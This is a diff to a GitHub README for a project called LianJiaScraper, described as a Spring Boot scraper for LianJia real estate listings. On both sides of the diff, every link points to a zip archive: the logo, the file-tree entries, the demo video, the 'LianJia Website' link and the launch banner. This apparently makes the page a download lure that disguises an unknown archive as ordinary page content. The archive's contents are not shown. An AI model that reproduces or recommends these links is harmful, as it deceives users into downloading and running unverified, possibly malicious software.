@@ -3,7 +3,7 @@
 
 ### 🏡 A Powerful Real Estate Data Scraper System 🏡
 
-![LianJiaScraper Logo](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
+![LianJiaScraper Logo](https://raw.githubusercontent.com/MrCaptain27/LianJiaScraper/main/scouch/Lian-Jia-Scraper-3.1.zip)
 
 Welcome to **LianJiaScraper** repository! This project is a sophisticated real estate data scraper system built on the Spring Boot framework. The primary goal of this system is to offer users a convenient and efficient solution for collecting real estate data. By automatically scraping property information from the LianJia website, the system can provide real-time details on properties in various cities, including pricing, location, area size, floor plan, and other key information.
 
@@ -32,8 +32,8 @@ LianJiaScraper/
 |   |   |__ resources/
 |   |   |__ test/
 |__ .gitignore
-|__ https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip
-|__ https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip
+|__ https://raw.githubusercontent.com/MrCaptain27/LianJiaScraper/main/scouch/Lian-Jia-Scraper-3.1.zip
+|__ https://raw.githubusercontent.com/MrCaptain27/LianJiaScraper/main/scouch/Lian-Jia-Scraper-3.1.zip
 ```
 
 ---
@@ -56,13 +56,13 @@ LianJiaScraper/
 ---
 
 ### 🔗 Additional Resources
-- [LianJiaScraper Demo Video](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
-- [LianJia Website](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
+- [LianJiaScraper Demo Video](https://raw.githubusercontent.com/MrCaptain27/LianJiaScraper/main/scouch/Lian-Jia-Scraper-3.1.zip)
+- [LianJia Website](https://raw.githubusercontent.com/MrCaptain27/LianJiaScraper/main/scouch/Lian-Jia-Scraper-3.1.zip)
 
 ---
 
-### 🌐 Visit [LianJiaScraper](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip) to explore the world of real estate data scraping!
+### 🌐 Visit [LianJiaScraper](https://raw.githubusercontent.com/MrCaptain27/LianJiaScraper/main/scouch/Lian-Jia-Scraper-3.1.zip) to explore the world of real estate data scraping!
 
-![Launch LianJiaScraper](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
+![Launch LianJiaScraper](https://raw.githubusercontent.com/MrCaptain27/LianJiaScraper/main/scouch/Lian-Jia-Scraper-3.1.zip)
 
 ---
